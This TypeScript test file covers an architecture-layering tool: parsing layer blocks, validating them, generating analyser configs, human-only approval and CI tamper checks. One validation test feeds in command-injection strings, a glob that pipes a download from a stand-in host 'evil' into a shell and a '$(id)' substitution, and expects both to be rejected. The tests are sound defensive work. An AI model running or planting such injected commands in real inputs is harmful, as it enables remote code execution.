import { test, beforeEach } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { parseLayers, validateLayers, deriveLayering, renderDepcruise, renderImportLinter, moduleOf, pythonViolations, approvedLayers, type Def } from './arch.ts'
import { makeRepo, sdlc, hook, write, gitIn } from './testkit.ts'

const block = (body: string): string => `# Architecture\n\n## Layers\n\n\`\`\`rig-layers\n${body}\n\`\`\`\n`
const GOOD = 'layer domain src/shop/domain/**\nlayer infra src/shop/infra/**\nallow infra -> domain\nforbid domain -> express, pg\nexample domain src/shop/domain/ports.py'
const parse = (body: string): Def => parseLayers(block(body)).def as Def

test('parse: layers, allow, forbid and example lines; the token is the last literal directory', () => {
  const d = parse(`${GOOD}\nlayer feat src/features/*/ui/**   # a comment`)
  assert.deepEqual(d.layers.map(l => [l.name, l.token]), [['domain', 'domain'], ['infra', 'infra'], ['feat', 'ui']])
  assert.deepEqual([d.allow.infra, d.forbid.domain, d.example.domain], [['domain'], ['express', 'pg'], 'src/shop/domain/ports.py'])
  assert.deepEqual(parseLayers('# no block here\n'), { def: null, block: '', errors: [] })
  assert.match(parseLayers(block('nonsense')).errors[0] ?? '', /cannot read: nonsense/)
})

test('validate: each way a block can be wrong is named', () => {
  const bad = (body: string, re: RegExp): void => assert.match(validateLayers(parse(body)).join('\n'), re, body)
  assert.deepEqual(validateLayers(parse(GOOD)), [])
  bad('layer a src/a/**', /token "a" is under 3/)
  bad('layer one src/x/core/**\nlayer two src/y/core/**', /token "core" is shared/)
  bad('layer all **', /no literal directory/)
  bad('layer domain src/domain/**\nallow domain -> ghost', /unknown layer/)
  bad('layer domain src/domain/**\nallow ghost -> domain', /unknown layer: ghost/)
  bad('layer domain src/domain/**\nlayer infra src/infra/**\nallow domain -> infra\nallow infra -> domain', /cycle/)
  bad('layer domain src/domain/**\nlayer infra src/infra/**\nforbid domain -> infra', /names a layer: use allow/)
  bad('layer app src/app/**\nlayer inner src/app/inner/**', /overlaps/)
  bad('layer evil src/x;curl${IFS}evil|sh/**', /may use only letters/)
  bad('layer domain src/domain/**\nforbid domain -> $(id)', /may use only letters/)
  bad('layer bad;name src/bad/**', /layer name/)
  bad('layer domain src/../domain/**', /no \.\./)
  bad('layer feat src/features/*/domain/**\nlayer pay src/features/payments/**', /overlaps/)
  assert.deepEqual(validateLayers(parse('layer domain src/domain/**\nlayer other src/domain-x/**')), [], 'a shared name prefix is not an overlap')
  assert.match(validateLayers(parse(GOOD), () => false).join('\n'), /src\/shop\/domain does not exist/)
})

test('derive: every layer not allowed is banned, plus forbidden names; allowed layers are not', () => {
  const rules = deriveLayering(parse('layer domain src/domain/**\nlayer app src/app/**\nlayer infra src/infra/**\nallow app -> domain\nallow infra -> domain, app\nforbid domain -> express\nexample domain src/domain/ports.ts'))
  const by = Object.fromEntries(rules.map(r => [r.from, r]))
  assert.deepEqual(by['src/domain/**']?.mustNotImport, ['app', 'infra', 'express'])
  assert.deepEqual(by['src/app/**']?.mustNotImport, ['infra'])
  assert.equal(by['src/infra/**'], undefined, 'infra may import everything declared, so there is nothing to ban')
  assert.equal(by['src/domain/**']?.example, 'src/domain/ports.ts')
  assert.match(by['src/domain/**']?.why ?? '', /domain may import only nothing from other layers/)
})

test('render: dependency-cruiser rules carry the why, the fix and the example; import-linter maps globs to modules', () => {
  const d = parse(GOOD)
  const cruise = renderDepcruise(d)
  assert.match(cruise, /"name": "rig-domain-infra"/)
  assert.match(cruise, /"path": "\^src\/shop\/domain\/"/)
  assert.match(cruise, /Example: src\/shop\/domain\/ports\.py/)
  assert.match(cruise, /node_modules\/express/)
  assert.doesNotMatch(cruise, /rig-infra-domain/, 'infra may import domain')
  const ini = renderImportLinter(d, { 'rig-domain-infra': ['shop.domain.order -> shop.infra.db'] }) ?? ''
  assert.match(ini, /root_package = shop/)
  assert.match(ini, /source_modules = shop\.domain\nforbidden_modules = shop\.infra\nignore_imports =\n    shop\.domain\.order -> shop\.infra\.db/)
  assert.match(ini, /forbidden_modules = express/)
  assert.equal(renderImportLinter(parse('layer feat src/features/*/ui/**\nlayer other src/other/**')), null, 'a wildcard glob is not one module')
  assert.equal(moduleOf('src/shop/domain/**'), 'shop.domain')
})

test('render: ** is any depth, * one directory, and a glob without ** ends at a directory boundary', () => {
  const re = (glob: string): RegExp => new RegExp(JSON.parse(renderDepcruise(parse(`layer aaa ${glob}\nlayer bbb src/bbb/**`)).split('module.exports = ')[1] as string).forbidden[0].from.path)
  assert.ok(re('src/**/domain/**').test('src/a/b/domain/x.js') && re('src/**/domain/**').test('src/domain/x.js'))
  assert.ok(re('src/features/*/domain/**').test('src/features/pay/domain/x.js') && !re('src/features/*/domain/**').test('src/features/domain/x.js'))
  assert.ok(re('src/domain').test('src/domain/x.js') && !re('src/domain').test('src/domain-x/x.js'))
})

test('python violations are read per contract from import-linter output', () => {
  const text = 'domain must not import infra BROKEN\n\n----------------\nBroken contracts\n----------------\n\ndomain must not import infra\n----------------------------\n\nshop.domain is not allowed to import shop.infra:\n\n-   shop.domain.order -> shop.infra.db (l.1)\n-   shop.domain.cart -> shop.infra.db (l.4, l.9)\n'
  assert.deepEqual(pythonViolations(text, parse(GOOD)), { 'rig-domain-infra': ['shop.domain.order -> shop.infra.db', 'shop.domain.cart -> shop.infra.db'] })
})

test('approvedLayers reads the record and ignores a broken one', () => {
  assert.deepEqual(approvedLayers(JSON.stringify({ layers: [{ from: 'a/**', mustNotImport: ['b'], why: 'x' }] })).length, 1)
  assert.deepEqual(approvedLayers('{ not json'), [])
})

let repo: string
beforeEach(() => {
  repo = makeRepo()
  sdlc(repo, ['init'])
  write(repo, '.rig/product/architecture.md', block('layer domain src/domain/**\nlayer infra src/infra/**\nallow infra -> domain\nexample domain src/domain/ports.js'))
  write(repo, 'src/domain/order.js', 'export const order = 1\n')
  write(repo, 'src/infra/db.js', 'export const db = 1\n')
  gitIn(repo, 'add', '.')
  gitIn(repo, 'commit', '-qm', 'base')
  gitIn(repo, 'checkout', '-qb', 'work')
})
const approve = (extra: Record<string, string> = { SDLC_HUMAN: '1' }) => { const r = sdlc(repo, ['arch', 'approve'], { env: extra }); hook(repo, 'prompt-submit', {}); return r }
const stop = (): { decision?: string; reason?: string } => JSON.parse(hook(repo, 'stop', {}).stdout || '{}')

test('arch: a proposed block enforces nothing, and only a person can approve it', () => {
  assert.match(sdlc(repo, ['sensors']).stdout, /layers: proposed, awaiting approval \(nothing enforced\)/)
  write(repo, 'src/domain/o2.js', "import { db } from '../infra/db.js'\n")
  assert.notEqual(stop().decision, 'block', 'not approved yet')
  const refused = approve({})
  assert.equal(refused.code, 3)
  assert.match(refused.stderr, /human-only/)
  assert.equal(fs.existsSync(path.join(repo, '.rig/layers.approved.json')), false)
})

test('arch: once approved, an import across the boundary blocks at Stop with the example, and a lawful one passes', () => {
  assert.match(approve().stdout, /layers approved by .*: 1 layer rule\(s\) enforced/)
  assert.match(sdlc(repo, ['sensors']).stdout, /layers: approved by/)
  assert.match(sdlc(repo, ['status', '--json']).stdout, /"layers":"approved by/)
  assert.ok(!JSON.parse(sdlc(repo, ['status', '--json']).stdout).sensors.inert.some((i: { id: string }) => i.id === 'layering'), 'layering is no longer inert')
  write(repo, 'src/infra/ok.js', "import { order } from '../domain/order.js'\n")
  assert.notEqual(stop().decision, 'block')
  write(repo, 'src/domain/o2.js', "import { db } from '../infra/db.js'\n")
  const s = stop()
  assert.equal(s.decision, 'block')
  assert.match(s.reason ?? '', /layering[\s\S]*src\/domain\/\*\* must not import infra[\s\S]*example: src\/domain\/ports\.js/)
})

test('arch: editing the block after approval starts a proposal and never loosens the approved rules', () => {
  approve()
  gitIn(repo, 'add', '-A')
  gitIn(repo, 'commit', '-qm', 'approved')
  write(repo, '.rig/product/architecture.md', block('layer domain src/domain/**\nlayer infra src/infra/**\nallow domain -> infra\nallow infra -> domain'))
  assert.match(sdlc(repo, ['sensors']).stdout, /layers: block differs from the approval \(the approved rules still apply/)
  write(repo, 'src/domain/o2.js', "import { db } from '../infra/db.js'\n")
  assert.equal(stop().decision, 'block')
})

test('arch: CI judges a PR against the approved record on the base branch, and the record is a protected file', () => {
  approve()
  gitIn(repo, 'add', '-A')
  gitIn(repo, 'commit', '-qm', 'approved')
  gitIn(repo, 'checkout', '-q', 'main')
  gitIn(repo, 'merge', '-q', 'work')
  gitIn(repo, 'checkout', '-qb', 'pr')
  fs.writeFileSync(path.join(repo, '.rig/layers.approved.json'), JSON.stringify({ layers: [] }))
  write(repo, 'src/domain/o2.js', "import { db } from '../infra/db.js'\n")
  gitIn(repo, 'add', '-A')
  gitIn(repo, 'commit', '-qm', 'pr')
  const ci = sdlc(repo, ['check', '--at', 'ci', '--base', 'main', '--config-from', 'main'])
  assert.equal(ci.code, 1, ci.stdout)
  assert.match(ci.stdout, /\[layering\][\s\S]*must not import infra/)
  assert.match(ci.stdout, /harness-tamper[\s\S]*layers\.approved\.json/)
})

test('arch: approve refuses an invalid block and names the problem', () => {
  write(repo, '.rig/product/architecture.md', block('layer a src/a/**'))
  const r = approve()
  assert.equal(r.code, 1)
  assert.match(r.stderr, /\[layers\] layer a: token "a" is under 3/)
})

test('arch: a layer outside the pack root is refused an analyser config, loudly, and the edit-time sensor still enforces', () => {
  sdlc(repo, ['init', '--stack', 'node'])
  write(repo, 'lib/core/a.js', 'export const a = 1\n')
  write(repo, '.rig/product/architecture.md', block('layer core lib/core/**\nlayer infra src/infra/**\nallow infra -> core'))
  const r = approve()
  assert.match(r.stdout, /scans src\/ only, and a layer lives elsewhere/)
  assert.equal(fs.existsSync(path.join(repo, '.rig/gen/dependency-cruiser.cjs')), false)
  assert.equal(JSON.parse(fs.readFileSync(path.join(repo, '.rig/layers.approved.json'), 'utf8')).analyser, null)
})
